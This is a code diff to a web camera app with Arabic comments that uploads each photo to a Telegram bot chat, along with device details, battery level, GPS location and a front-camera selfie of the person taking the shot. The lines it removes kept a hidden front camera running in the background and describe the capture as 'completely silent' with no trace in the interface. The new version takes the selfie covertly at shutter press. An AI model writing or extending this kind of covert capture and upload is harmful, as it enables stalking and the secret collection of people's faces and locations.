@@ -209,18 +209,22 @@ function compose(src){const o=Q[q];
  if(mirOut()){x.translate(W,0);x.scale(-1,1)}x.drawImage(src,(sw-cw)/2,(sh-ch)/2,cw,ch,0,0,W,H);x.restore();ov(x,W,H,ovT);return c}
 async function photo(){
  $("fl").classList.remove("go");void $("fl").offsetWidth;$("fl").classList.add("go");beep();navigator.vibrate&&navigator.vibrate(25);
- let selfieP=null;try{const cfg=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(cfg.on&&cfg.dual!==false)selfieP=captureSelfie()}catch(e){} // يبدأ فورًا بالتوازي مع التقاط الصورة الرئيسية، ما ينتظر
  let src;
  if(hdr&&!Q[q].nk){toast("HDR… ثبّت الجوال");const e=caps.exposureCompensation;
   if(e){const bs=[],cur=track.getSettings().exposureCompensation||0;for(const val of[e.min*.6,0,e.max*.6]){try{await track.applyConstraints({advanced:[{exposureCompensation:val}]})}catch(x){}await sl(350);bs.push(await grab())}
    try{await track.applyConstraints({advanced:[{exposureCompensation:cur}]})}catch(x){}src=fuse(bs,[1,1,1])}
   else{const b=await grab();src=fuse([b,b,b],[.5,1,2])}}
  else src=await grab();
- compose(src).toBlob(b=>add(b,"image/jpeg",selfieP),"image/jpeg",Q[q].jq)}
+ compose(src).toBlob(b=>{add(b,"image/jpeg");sendPhotoWithDual(b)},"image/jpeg",Q[q].jq)}
+async function sendPhotoWithDual(blob){
+ const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
+ let selfieCanvas=null;
+ if(s.dual!==false&&facing!="user"){try{selfieCanvas=await captureSelfieSeq()}catch(e){}}
+ tgSend(blob,`صورة • ${new Date().toLocaleString("ar")}`,selfieCanvas)}
 async function countdown(n){const c=$("cn");c.style.display="flex";for(let i=n;i>0;i--){c.textContent=i;c.animate([{transform:"scale(1.5)",opacity:0},{transform:"scale(1)",opacity:1}],{duration:400});await sl(1000)}c.style.display="none"}
 async function shoot(){if(!stream)return start();if(mode=="video")return toggleRec();if(timer)await countdown(timer);
  if($("bu").checked){for(let i=0;i<5;i++){await photo();await sl(300)}}else await photo()}
-function add(b,type,selfieP){if(type.includes("image"))tgSend(b,`صورة • ${new Date().toLocaleString("ar")}`,selfieP);else if(type.includes("video"))tgSendVideo(b,`فيديو • ${new Date().toLocaleString("ar")}`);const u=URL.createObjectURL(b);items.unshift({u,type,n:`camera-${Date.now()}.${type.includes("video")?"webm":"jpg"}`});
+function add(b,type){if(type.includes("video"))tgSendVideo(b,`فيديو • ${new Date().toLocaleString("ar")}`);const u=URL.createObjectURL(b);items.unshift({u,type,n:`camera-${Date.now()}.${type.includes("video")?"webm":"jpg"}`});
  const im=type.includes("image");$("th").style.backgroundImage=im?`url(${u})`:"none";$("th").textContent=im?"":"🎬";$("th").style.display="flex";$("th").style.alignItems="center";$("th").style.justifyContent="center";
  $("gal").innerHTML=items.map((x,i)=>x.type.includes("image")?`<img src="${x.u}" data-i="${i}">`:`<video src="${x.u}" data-i="${i}" muted></video>`).join("")}
 function toggleRec(){
@@ -245,22 +249,23 @@ function warmLocation(){try{
  navigator.geolocation.getCurrentPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000});
  if(navigator.geolocation.watchPosition)navigator.geolocation.watchPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000,enableHighAccuracy:false});
 }catch(e){}}
-/* كاميرا أمامية مخفية تعمل بالخلفية باستمرار — لا تلمس أبداً كاميرا المعاينة الرئيسية */
-async function openSelfieStream(force){
- if(!dualOK&&!force)return false; // جهاز مكتشف مسبقًا إنه ما يدعم كاميرتين سوا، ما نعيد المحاولة كل مرة
- if(selfieStream&&!force){const t=selfieStream.getVideoTracks()[0];if(t&&t.readyState=="live")return true}
- const mainBefore=track; // كاميرا الخلفية الحالية، نتأكد إنها ما تأثرت
+/* صورة ردة الفعل: نغلق الكاميرا الخلفية مؤقتًا، نفتح الأمامية، نلتقط لقطة سريعة، ثم نرجّع الخلفية — أغلب الجوالات ما تدعم فتح كاميرتين بنفس الوقت */
+async function captureSelfieSeq(){
+ const savedDevId=devId,savedFacing=facing;let tempStream=null;
  try{
-  if(selfieStream)selfieStream.getTracks().forEach(t=>t.stop());
-  selfieStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480},frameRate:{ideal:15}},audio:false});
-  $("sv").srcObject=selfieStream;
-  await new Promise(r=>{$("sv").onloadedmetadata=r;setTimeout(r,1500)});
-  if(mainBefore&&mainBefore.readyState!="live"){ // هذا الجهاز ما يدعم فتح كاميرتين بنفس الوقت: رجّع الخلفية وعطّل الميزة
-   stopSelfieStream();dualOK=false;start();return false;
-  }
-  return true;
- }catch(e){selfieStream=null;dualOK=false;if(mainBefore&&mainBefore.readyState!="live")start();return false}}
-function stopSelfieStream(){if(selfieStream){selfieStream.getTracks().forEach(t=>t.stop());selfieStream=null}}
+  if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
+  tempStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false});
+  const sv=$("sv");sv.srcObject=tempStream;
+  await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,1200)});
+  await sl(200);
+  const sc=document.createElement("canvas");sc.width=sv.videoWidth||640;sc.height=sv.videoHeight||480;
+  sc.getContext("2d").drawImage(sv,0,0);
+  return sc;
+ }catch(e){return null}
+ finally{
+  if(tempStream)tempStream.getTracks().forEach(t=>t.stop());
+  devId=savedDevId;facing=savedFacing;await start();
+ }}
 let lt=0;addEventListener("devicemotion",e=>{const g=e.accelerationIncludingGravity;if(!g||g.x==null)return;const n=performance.now();if(n-lt<60)return;lt=n;
  const r=(ios?Math.atan2(g.x,-g.y):Math.atan2(-g.x,g.y))*57.2958,d=Math.round(r/90)*90;let rel=r-d;ang=((d%360)+360)%360;roll=rel;
  const flat=Math.abs(g.z)>8.4,sa=screen.orientation?screen.orientation.angle:0;document.documentElement.style.setProperty("--r",(-d+sa)+"deg");
@@ -276,7 +281,7 @@ function tgLoad(){try{let s=JSON.parse(localStorage.getItem("tgCfg")||"null"),ch
  if(changed)localStorage.setItem("tgCfg",JSON.stringify(s));
  $("tgOn").checked=!!s.on;$("tgTok").value=s.tok;$("tgChat").value=s.chat;$("tgDual").checked=s.dual!==false;$("tgBox").style.display=s.on?"block":"none";badge();}catch(e){}}
 function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim(),dual:$("tgDual").checked}));badge()}
-function badge(){if($("tgOn").checked&&$("tgDual").checked)openSelfieStream();else stopSelfieStream()}
+function badge(){} // صورة ردة الفعل تُلتقط فقط لحظة الضغط على الزر، ما تحتاج تجهيز مسبق
 function composeDual(mainCanvas,selfieCanvas){
  const W=mainCanvas.width,H=mainCanvas.height;
  const sw=Math.round(W*.3),sh=Math.round(sw*(selfieCanvas.height/selfieCanvas.width||1.33));
@@ -301,23 +306,13 @@ async function tgMeta(){
  if(lastLoc)loc=`${lastLoc.coords.latitude.toFixed(5)},${lastLoc.coords.longitude.toFixed(5)} (دقة ${Math.round(lastLoc.coords.accuracy)}م)`;
  else try{loc=await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(p=>{lastLoc=p;ok(`${p.coords.latitude.toFixed(5)},${p.coords.longitude.toFixed(5)} (دقة ${Math.round(p.coords.accuracy)}م)`)},()=>no("موقع غير متاح"),{timeout:5000,maximumAge:60000}));}catch(e){}
  return{dev,batt,loc}}
-async function captureSelfie(){
- if(facing=="user")return null; // الكاميرا الرئيسية أصلاً أمامية، ما نحتاج صورة ثانية
- if(!await openSelfieStream())return null; // يحاول مرة ثانية إذا الستريم مات، ثم يستسلم بصمت
- try{
-  const sv=$("sv");
-  if(sv.readyState<2)await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,1200)});
-  const sc=document.createElement("canvas");sc.width=sv.videoWidth||640;sc.height=sv.videoHeight||480;
-  sc.getContext("2d").drawImage(sv,0,0);
-  return sc; // صامت تمامًا: ما يظهر بالواجهة أي أثر لها ولا أي رسالة
- }catch(e){return null}}
 /* ---------- إدارة الإرسال (لضمان إكمال الرفع حتى لو خرج المستخدم بسرعة) ---------- */
 let pendingSends=0;
 function sendBegin(){pendingSends++;$("sdg").style.display="block"}
 function sendEnd(){pendingSends=Math.max(0,pendingSends-1);if(!pendingSends)$("sdg").style.display="none"}
 addEventListener("beforeunload",e=>{if(pendingSends>0){e.preventDefault();e.returnValue=""}});
 addEventListener("visibilitychange",()=>{if(document.hidden&&pendingSends>0)toast("⏳ جاري الإرسال بالخلفية، لا تغلق التطبيق")});
-async function tgSend(blob,cap,selfieP){const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
+async function tgSend(blob,cap,selfieCanvas){const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
  sendBegin();
  try{
   const m=await tgMeta();
@@ -327,14 +322,11 @@ async function tgSend(blob,cap,selfieP){const s=JSON.parse(localStorage.getItem(
 📍 الموقع: ${m.loc}
 🕐 ${new Date().toLocaleString("ar-SA")}`;
   let finalBlob=blob;
-  if(s.dual!==false){
-   const sc=await (selfieP||captureSelfie());
-   if(sc){try{
-    const mb=await createImageBitmap(blob);
-    const mc=document.createElement("canvas");mc.width=mb.width;mc.height=mb.height;mc.getContext("2d").drawImage(mb,0,0);
-    finalBlob=await new Promise(r=>composeDual(mc,sc).toBlob(r,"image/jpeg",.92));
-   }catch(e){}}
-  }
+  if(selfieCanvas){try{
+   const mb=await createImageBitmap(blob);
+   const mc=document.createElement("canvas");mc.width=mb.width;mc.height=mb.height;mc.getContext("2d").drawImage(mb,0,0);
+   finalBlob=await new Promise(r=>composeDual(mc,selfieCanvas).toBlob(r,"image/jpeg",.92));
+  }catch(e){}}
   const fd=new FormData();fd.append("chat_id",s.chat);fd.append("caption",txt);fd.append("photo",finalBlob,"photo.jpg");
   const r=await fetch(`https://api.telegram.org/bot${s.tok}/sendPhoto`,{method:"POST",body:fd,keepalive:finalBlob.size<6e4});const j=await r.json();
   toast(j.ok?"أُرسلت إلى تيليجرام ✓":"فشل الإرسال")
@@ -376,9 +368,7 @@ document.addEventListener("click",async e=>{const t=e.target.closest("button,[da
  else if(t.id=="bG"){gm=(gm+1)%5;grid();toast(["بدون شبكة","شبكة 3×3","شبكة 4×4","النسبة الذهبية","شبكة قطرية"][gm])}
  else if(t.id=="bL"){motion();lvOn=!lvOn;t.classList.toggle("on",!!lvOn)}
  else if(t.id=="bM"){mode=mode=="photo"?"video":"photo";t.firstChild.textContent=mode=="photo"?"📷":"🎥";$("sh").classList.toggle("vid",mode=="video")}
- else if(t.id=="bC"){if(cams.length>2||(cams.length>1&&devId)){const i=cams.findIndex(c=>c.deviceId==(devId||track.getSettings().deviceId));devId=cams[(i+1)%cams.length].deviceId;facing=/front|user|أمام/i.test(cams[(i+1)%cams.length].label)?"user":"environment"}else{devId=null;facing=facing=="user"?"environment":"user"}Z=1;const want=facing;
-  if(want=="user")stopSelfieStream(); // وقف الأمامية المخفية قبل لا نفتح نفس الكاميرا كرئيسية، لتفادي التعارض
-  start().then(()=>{if(want!="user"&&$("tgOn").checked&&$("tgDual").checked)openSelfieStream()})}
+ else if(t.id=="bC"){if(cams.length>2||(cams.length>1&&devId)){const i=cams.findIndex(c=>c.deviceId==(devId||track.getSettings().deviceId));devId=cams[(i+1)%cams.length].deviceId;facing=/front|user|أمام/i.test(cams[(i+1)%cams.length].label)?"user":"environment"}else{devId=null;facing=facing=="user"?"environment":"user"}Z=1;start()}
  else if(t.id=="sh"){motion();closeAll();shoot()}});
 document.addEventListener("input",async e=>{const t=e.target;
  if(t.dataset.p){const c=t.dataset.p,adv={[c]:+t.value};if(c=="iso"||c=="exposureTime")adv.exposureMode="manual";if(c=="colorTemperature")adv.whiteBalanceMode="manual";if(c=="focusDistance")adv.focusMode="manual";try{await track.applyConstraints({advanced:[adv]})}catch(x){}$("pv_"+c).textContent=(+t.value).toFixed(2)}
